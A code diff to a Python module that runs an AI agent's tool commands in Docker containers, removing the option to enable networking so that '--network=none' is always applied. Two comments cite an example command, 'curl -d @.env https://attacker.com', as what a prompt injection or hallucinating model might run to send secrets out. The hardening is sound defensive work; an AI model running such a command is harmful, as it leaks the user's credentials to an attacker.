@@ -127,6 +127,12 @@ LABEL_OWNER = "aleth.owner_pid"
 LABEL_OWNER_START = "aleth.owner_start"
 MANAGED_FILTER = f"label={LABEL_MANAGED}=true"
 
+# The container's network, and it is a constant rather than a parameter on purpose (Phase 28).
+# Egress during tool execution is an exfiltration primitive -- an LLM hallucination or a prompt
+# injection can run ``curl -d @.env https://attacker.com`` -- and the capability that used to widen
+# it is gone. A run that needs a package installed does that before the loop starts.
+SANDBOX_NETWORK = "none"
+
 # Containers this process has started and not yet finished. The signal handler in the exec
 # server removes these; ``run_isolated`` adds and removes them around each command.
 _ACTIVE: Dict[str, str] = {}
@@ -453,7 +459,6 @@ def build_command(
     max_processes: int = DEFAULT_MAX_PROCESSES,
     image_name: Optional[str] = None,
     execution_id: Optional[str] = None,
-    allow_network: bool = False,
 ) -> List[str]:
     """The ``docker run`` argv for one command.
 
@@ -462,15 +467,12 @@ def build_command(
     used as written -- the path is a path *in the daemon's filesystem*, because the orchestrator
     runs there too.
 
-    ``allow_network`` is the **only** way to widen the sandbox, and it is off by default: the
-    baseline is ``--network=none``, absolute isolation, with no egress and no ingress. It exists
-    because a few tools genuinely need the network (an HTTP client, a scraper, a package
-    installer) and the alternative -- leaving egress open for everything so one tool can use it --
-    is how a boundary becomes decoration.
-
-    It is deliberately **not** reachable from a tool call. The declaration travels from the plan's
-    ``required_capabilities`` through ``orchestration.mcp_session`` to the exec server's own
-    command line; a model that could grant itself the network would not have a boundary at all.
+    **There is no way to widen the network, and that is the whole contract.** ``--network=none`` is
+    unconditional (Phase 28). It used to be overridable by a plan-declared ``net`` capability, and
+    the escape was removed: an LLM hallucination or a prompt injection running
+    ``curl -d @.env https://attacker.com`` inside a container that *can* reach the network is a
+    secret-exfiltration primitive, and "the plan said so" is not a mitigation for it. A run that
+    needs a package installed installs it before the loop starts, outside the model's reach.
 
     The resource budget is bounded by the same rule, enforced here in the builder: ``memory_mb``
     and ``cpus`` are clamped to :data:`MAX_MEMORY_MB`/:data:`MAX_CPUS`, so nothing a model can say
@@ -482,7 +484,6 @@ def build_command(
     """
     uid, gid = host_identity()
     resolved = str(Path(root).resolve())
-    network = "bridge" if allow_network else "none"
     memory_mb, cpus = _clamp_limits(memory_mb, cpus)
     return [
         *docker_bin(), "run", "--rm",
@@ -491,7 +492,7 @@ def build_command(
         "--label", f"{LABEL_EXECUTION}={execution_id or name}",
         "--label", f"{LABEL_OWNER}={os.getpid()}",
         "--label", f"{LABEL_OWNER_START}={_process_start_time(os.getpid()) or ''}",
-        f"--network={network}",
+        f"--network={SANDBOX_NETWORK}",
         "--user", f"{uid}:{gid}",
         "--workdir", WORKSPACE_MOUNT,
         "--mount", f"type=bind,source={resolved},target={WORKSPACE_MOUNT}",
@@ -892,7 +893,6 @@ def run_isolated(
     memory_mb: int = DEFAULT_MEMORY_MB,
     cpus: float = DEFAULT_CPUS,
     max_processes: int = DEFAULT_MAX_PROCESSES,
-    allow_network: bool = False,
 ) -> IsolatedResult:
     """Run ``command`` in a container rooted at ``cwd``, or raise :class:`SandboxError`.
 
@@ -900,8 +900,8 @@ def run_isolated(
     The command is never executed on the host -- when the runtime or the image cannot be reached
     this raises rather than falling back.
 
-    ``allow_network`` defaults to ``False``, so the network is sealed unless a caller that knows
-    what it is doing asks otherwise (see :func:`build_command`).
+    The network is sealed unconditionally (see :func:`build_command`): there is no argument here
+    that opens it, because the one that existed was an exfiltration primitive.
     """
     root = Path(cwd).resolve()
     if not root.is_dir():
@@ -914,7 +914,6 @@ def run_isolated(
         argv = build_command(
             command, root=str(root), name=name, memory_mb=memory_mb, cpus=cpus,
             max_processes=max_processes, image_name=target, execution_id=execution_id,
-            allow_network=allow_network,
         )
     except EnvironmentError as error:
         # The client is missing: a fatal configuration error, reported at the tool boundary as
